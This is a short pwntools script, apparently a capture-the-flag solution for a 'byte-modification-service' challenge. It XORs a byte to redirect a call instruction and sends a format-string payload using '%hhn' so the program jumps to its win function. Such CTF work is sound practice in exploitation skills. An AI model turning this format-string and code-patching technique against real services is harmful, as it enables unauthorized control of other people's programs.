from pwn import *

# Set up pwntools for the correct architecture
exe = './challenge/chall'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

io = remote('byte-modification-service.challs.csc.tf', 1337)

win = elf.functions.win.address
bye = elf.functions.bye.address
call_instruction = 0x4014be

return_addr = 0x4014fa
call_addr_byte = call_instruction + 1
xor_val = call_addr_byte ^ return_addr
if xor_val > 0xff:
    raise Exception('will not work')


call_offset = win - (call_instruction + 5)
if call_offset < 0:
    call_offset = 0xffff + call_offset + 1

# only the last byte differs
write_val = call_offset & 0xff

io.sendlineafter(b'want to use?\n', b'11')
io.sendlineafter(b'Index?\n', b'0')
io.sendlineafter(b'xor with?\n', str(xor_val).encode())
io.sendlineafter(b'service.\n', f'%{write_val}c%9$hhn@'.encode())
print(io.recvall().decode())
io.close()
